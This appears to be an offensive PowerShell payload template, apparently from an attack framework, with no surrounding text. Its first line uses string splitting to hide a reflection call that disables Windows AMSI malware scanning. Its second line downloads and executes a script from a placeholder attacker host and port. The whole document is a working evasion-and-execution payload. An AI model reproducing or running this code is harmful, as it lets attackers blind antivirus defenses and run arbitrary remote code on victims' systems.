[Ref].Assembly.GetType('System.M'+'ana'+'gement.Automation.A'+'msi'+'Uti'+'ls').GetField('ams'+'iIni'+'tFa'+'iled','NonPublic,Static').SetValue($null,$true);
iex((New-Object system.net.WebClient).DownloadString('https://#{lhost}:#{lport}/#{uri}'))
